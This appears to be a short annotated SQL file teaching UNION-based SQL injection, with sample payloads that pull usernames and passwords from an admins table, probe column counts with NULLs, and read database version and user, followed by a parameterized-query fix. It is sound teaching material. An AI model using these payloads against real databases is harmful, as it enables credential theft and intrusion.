-- UNION-Based SQL Injection
-- Attacker extends the original query with UNION to return data from other tables.

-- Original (vulnerable) query
SELECT id, name, email FROM users WHERE id = 1;

-- Malicious input: id = 1 UNION SELECT username, password, NULL FROM admins
SELECT id, name, email FROM users WHERE id = 1 UNION SELECT username, password, NULL FROM admins;

-- Column count discovery: keep adding NULLs until the query executes without error
SELECT id, name, email FROM users WHERE id = 1 UNION SELECT NULL, NULL, NULL;

-- Data exfiltration example
SELECT id, name, email FROM users WHERE id = 1 UNION SELECT version(), database(), user();

-- Prevention: use parameterized queries (never concatenate user input into SQL)
SELECT id, name, email FROM users WHERE id = ?;
